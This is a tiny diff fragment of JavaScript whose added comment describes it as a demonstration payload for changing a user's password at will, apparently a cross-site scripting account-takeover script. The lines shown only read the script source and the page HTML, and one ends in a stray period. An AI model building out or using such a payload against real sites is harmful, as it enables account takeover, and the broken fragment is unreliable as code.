@@ -1,3 +1,4 @@
+//a youtube demonstration payload that can change the users password to whatever you please
 var src = document.currentScript.src.
 
 var oldHtml = document.body.innerHTML;
